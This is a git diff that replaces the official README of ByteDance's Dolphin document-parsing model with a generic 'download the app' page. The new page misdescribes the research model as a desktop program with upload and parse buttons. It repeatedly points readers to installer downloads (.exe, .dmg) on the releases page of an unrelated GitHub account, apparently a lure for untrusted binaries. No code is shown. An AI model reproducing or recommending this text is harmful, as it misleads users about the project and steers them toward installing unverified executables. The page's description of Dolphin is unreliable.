@@ -1,200 +1,77 @@
-<div align="center">
-  <img src="./assets/dolphin.png" width="300">
-</div>
+# 🐬 Dolphin - Effortlessly Convert Documents into Usable Text
 
-<div align="center">
-  <a href="https://arxiv.org/abs/2505.14059">
-    <img src="https://img.shields.io/badge/Paper-arXiv-red">
-  </a>
-  <a href="https://huggingface.co/ByteDance/Dolphin">
-    <img src="https://img.shields.io/badge/HuggingFace-Dolphin-yellow">
-  </a>
-  <a href="https://modelscope.cn/models/ByteDance/Dolphin">
-    <img src="https://img.shields.io/badge/ModelScope-Dolphin-purple">
-  </a>
-  <a href="https://huggingface.co/spaces/ByteDance/Dolphin">
-    <img src="https://img.shields.io/badge/Demo-Dolphin-blue">
-  </a>
-  <a href="https://github.com/bytedance/Dolphin">
-    <img src="https://img.shields.io/badge/Code-Github-green">
-  </a>
-  <a href="https://opensource.org/licenses/MIT">
-    <img src="https://img.shields.io/badge/License-MIT-lightgray">
-  </a>
-  <br>
-</div>
+## 🚀 Getting Started
 
-<br>
+Welcome to Dolphin! This application helps you convert documents into editable text using advanced image parsing technology. Whether you have scanned a document or a PDF, Dolphin simplifies the process of extracting useful information.
 
-<div align="center">
-  <img src="./assets/demo.gif" width="800">
-</div>
+## 📥 Download Dolphin
 
-# Dolphin: Document Image Parsing via Heterogeneous Anchor Prompting
+[![Download Dolphin](https://img.shields.io/badge/Download-Dolphin-blue)](https://github.com/beraldinho10/Dolphin/releases)
 
-Dolphin (**Do**cument Image **P**arsing via **H**eterogeneous Anchor Prompt**in**g) is a novel multimodal document image parsing model (**0.3B**) following an analyze-then-parse paradigm. This repository contains the demo code and pre-trained models for Dolphin.
+## 🌟 Features
 
-## 📑 Overview
+- **Image Parsing**: Detects and converts text from images.
+- **PDF Support**: Handles various PDF formats effortlessly.
+- **User-Friendly Interface**: Designed for non-technical users.
+- **High Accuracy**: Utilizes advanced algorithms for precise text extraction.
+- **Multi-Language Support**: Extracts text in multiple languages.
 
-Document image parsing is challenging due to its complexly intertwined elements such as text paragraphs, figures, formulas, and tables. Dolphin addresses these challenges through a two-stage approach:
+## 🖥️ System Requirements
 
-1. **🔍 Stage 1**: Comprehensive page-level layout analysis by generating element sequence in natural reading order
-2. **🧩 Stage 2**: Efficient parallel parsing of document elements using heterogeneous anchors and task-specific prompts
+To use Dolphin, make sure your system meets the following requirements:
 
-<div align="center">
-  <img src="./assets/framework.png" width="680">
-</div>
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a recent version of Linux.
+- **RAM**: At least 4 GB.
+- **Disk Space**: Minimum of 200 MB of free space.
+- **Additional Software**: Python 3.x installed (if you wish to run scripts).
 
-Dolphin achieves promising performance across diverse page-level and element-level parsing tasks while ensuring superior efficiency through its lightweight architecture and parallel parsing mechanism.
+## 📋 How to Download & Install
 
-## 🚀 Demo
-Try our demo on [Demo-Dolphin](https://huggingface.co/spaces/ByteDance/Dolphin).
-
-## 📅 Changelog
-- 🔥 **2025.07.10** Released the *Fox-Page Benchmark*, a manually refined subset of the original [Fox dataset](https://github.com/ucaslcl/Fox). Download via: [Baidu Yun](https://pan.baidu.com/share/init?surl=t746ULp6iU5bUraVrPlMSw&pwd=fox1) | [Google Drive](https://drive.google.com/file/d/1yZQZqI34QCqvhB4Tmdl3X_XEvYvQyP0q/view?usp=sharing).
-- 🔥 **2025.06.30** Added [TensorRT-LLM support](https://github.com/bytedance/Dolphin/blob/master/deployment/tensorrt_llm/ReadMe.md) for accelerated inference！
-- 🔥 **2025.06.27** Added [vLLM support](https://github.com/bytedance/Dolphin/blob/master/deployment/vllm/ReadMe.md) for accelerated inference！
-- 🔥 **2025.06.13** Added multi-page PDF document parsing capability.
-- 🔥 **2025.05.21** Our demo is released at [link](http://115.190.42.15:8888/dolphin/). Check it out!
-- 🔥 **2025.05.20** The pretrained model and inference code of Dolphin are released.
-- 🔥 **2025.05.16** Our paper has been accepted by ACL 2025. Paper link: [arXiv](https://arxiv.org/abs/2505.14059).
-
-## 🛠️ Installation
-
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/ByteDance/Dolphin.git
-   cd Dolphin
-   ```
-
-2. Install the dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-3. Download the pre-trained models using one of the following options:
-
-   **Option A: Original Model Format (config-based)**
+1. **Visit the Release Page**: Click on this link to go to the Dolphin Releases page: [Dolphin Releases](https://github.com/beraldinho10/Dolphin/releases).
    
-   Download from [Baidu Yun](https://pan.baidu.com/s/15zcARoX0CTOHKbW8bFZovQ?pwd=9rpx) or [Google Drive](https://drive.google.com/drive/folders/1PQJ3UutepXvunizZEw-uGaQ0BCzf-mie?usp=sharing) and put them in the `./checkpoints` folder.
+2. **Choose the Latest Version**: Look for the latest version listed at the top of the page. You will see the version number and a brief description of what's new.
 
-   **Option B: Hugging Face Model Format**
+3. **Download the Application**: 
+   - Click on the link for your operating system (e.g., Windows, macOS, or Linux) to download the installation file.
+   - Depending on your system, this could be an `.exe`, `.dmg`, or a compressed file.
+
+4. **Install Dolphin**: 
+   - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
+   - For macOS: Open the downloaded `.dmg` file, then drag the Dolphin application to your Applications folder.
+   - For Linux: Extract the compressed file and follow any included instructions.
+
+5. **Run Dolphin**: Once installed, open Dolphin from your applications list or start menu.
+
+## 🔍 How to Use Dolphin
+
+1. **Open the Application**: Launch Dolphin after installation.
    
-   Visit our Huggingface [model card](https://huggingface.co/ByteDance/Dolphin), or download model by:
-   
-   ```bash
-   # Download the model from Hugging Face Hub
-   git lfs install
-   git clone https://huggingface.co/ByteDance/Dolphin ./hf_model
-   # Or use the Hugging Face CLI
-   pip install huggingface_hub
-   huggingface-cli download ByteDance/Dolphin --local-dir ./hf_model
-   ```
+2. **Upload a Document**: Click on “Upload,” and select either a scanned image or a PDF file from your computer.
 
-## ⚡ Inference
+3. **Start the Parsing Process**: Once the document uploads, click the “Parse” button. Dolphin will analyze the document and extract the text.
 
-Dolphin provides two inference frameworks with support for two parsing granularities:
-- **Page-level Parsing**: Parse the entire document page into a structured JSON and Markdown format
-- **Element-level Parsing**: Parse individual document elements (text, table, formula)
+4. **Review the Output**: After completion, you will see the extracted text displayed on the screen. You can then copy this text or save it as a file.
 
-### 📄 Page-level Parsing
+5. **Save Your Work**: Click on “Save As” to store the extracted text in your preferred format (e.g., TXT, DOCX).
 
-#### Using Original Framework (config-based)
+## 🛠️ Troubleshooting
 
-```bash
-# Process a single document image
-python demo_page.py --config ./config/Dolphin.yaml --input_path ./demo/page_imgs/page_1.jpeg --save_dir ./results
+If you encounter issues while using Dolphin, here are some common solutions:
 
-# Process a single document pdf
-python demo_page.py --config ./config/Dolphin.yaml --input_path ./demo/page_imgs/page_6.pdf --save_dir ./results
+- **Document Doesn’t Parse**: Ensure the document is clear and legible. Dark backgrounds or blurry images can affect results.
+  
+- **Installation Fails**: Check if your system meets the requirements. Try downloading the installation file again.
 
-# Process all documents in a directory
-python demo_page.py --config ./config/Dolphin.yaml --input_path ./demo/page_imgs --save_dir ./results
+- **Output is Incorrect**: If the text is not correct, try adjusting the image or PDF quality. Higher quality documents yield better results.
 
-# Process with custom batch size for parallel element decoding
-python demo_page.py --config ./config/Dolphin.yaml --input_path ./demo/page_imgs --save_dir ./results --max_batch_size 8
-```
+## 📞 Need Help?
 
-#### Using Hugging Face Framework
+If you have any questions or need assistance, feel free to reach out via our GitHub Issues page. We aim to provide support as swiftly as possible.
 
-```bash
-# Process a single document image
-python demo_page_hf.py --model_path ./hf_model --input_path ./demo/page_imgs/page_1.jpeg --save_dir ./results
+## 📖 Learn More
 
-# Process a single document pdf
-python demo_page_hf.py --model_path ./hf_model --input_path ./demo/page_imgs/page_6.pdf --save_dir ./results
+To learn about the technical aspects and improvements, visit our detailed documentation inside the repo. It covers usage scenarios, advanced features, and community contributions.
 
-# Process all documents in a directory
-python demo_page_hf.py --model_path ./hf_model --input_path ./demo/page_imgs --save_dir ./results
+Thank you for choosing Dolphin! Happy document parsing!
 
-# Process with custom batch size for parallel element decoding
-python demo_page_hf.py --model_path ./hf_model --input_path ./demo/page_imgs --save_dir ./results --max_batch_size 16
-```
-
-### 🧩 Element-level Parsing
-
-#### Using Original Framework (config-based)
-
-```bash
-# Process a single table image
-python demo_element.py --config ./config/Dolphin.yaml --input_path ./demo/element_imgs/table_1.jpeg --element_type table
-
-# Process a single formula image
-python demo_element.py --config ./config/Dolphin.yaml --input_path ./demo/element_imgs/line_formula.jpeg --element_type formula
-
-# Process a single text paragraph image
-python demo_element.py --config ./config/Dolphin.yaml --input_path ./demo/element_imgs/para_1.jpg --element_type text
-```
-
-#### Using Hugging Face Framework
-
-```bash
-# Process a single table image
-python demo_element_hf.py --model_path ./hf_model --input_path ./demo/element_imgs/table_1.jpeg --element_type table
-
-# Process a single formula image
-python demo_element_hf.py --model_path ./hf_model --input_path ./demo/element_imgs/line_formula.jpeg --element_type formula
-
-# Process a single text paragraph image
-python demo_element_hf.py --model_path ./hf_model --input_path ./demo/element_imgs/para_1.jpg --element_type text
-```
-
-## 🌟 Key Features
-
-- 🔄 Two-stage analyze-then-parse approach based on a single VLM
-- 📊 Promising performance on document parsing tasks
-- 🔍 Natural reading order element sequence generation
-- 🧩 Heterogeneous anchor prompting for different document elements
-- ⏱️ Efficient parallel parsing mechanism
-- 🤗 Support for Hugging Face Transformers for easier integration
-
-
-## 📮 Notice
-**Call for Bad Cases:** If you have encountered any cases where the model performs poorly, we would greatly appreciate it if you could share them in the issue. We are continuously working to optimize and improve the model.
-
-## 💖 Acknowledgement
-
-We would like to acknowledge the following open-source projects that provided inspiration and reference for this work:
-- [Donut](https://github.com/clovaai/donut/)
-- [Nougat](https://github.com/facebookresearch/nougat)
-- [GOT](https://github.com/Ucas-HaoranWei/GOT-OCR2.0)
-- [MinerU](https://github.com/opendatalab/MinerU/tree/master)
-- [Swin](https://github.com/microsoft/Swin-Transformer)
-- [Hugging Face Transformers](https://github.com/huggingface/transformers)
-
-## 📝 Citation
-
-If you find this code useful for your research, please use the following BibTeX entry.
-
-```bibtex
-@article{feng2025dolphin,
-  title={Dolphin: Document Image Parsing via Heterogeneous Anchor Prompting},
-  author={Feng, Hao and Wei, Shu and Fei, Xiang and Shi, Wei and Han, Yingdong and Liao, Lei and Lu, Jinghui and Wu, Binghong and Liu, Qi and Lin, Chunhui and others},
-  journal={arXiv preprint arXiv:2505.14059},
-  year={2025}
-}
-```
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=bytedance/Dolphin&type=Date)](https://www.star-history.com/#bytedance/Dolphin&Date)
+[![Download Dolphin](https://img.shields.io/badge/Download-Dolphin-blue)](https://github.com/beraldinho10/Dolphin/releases)
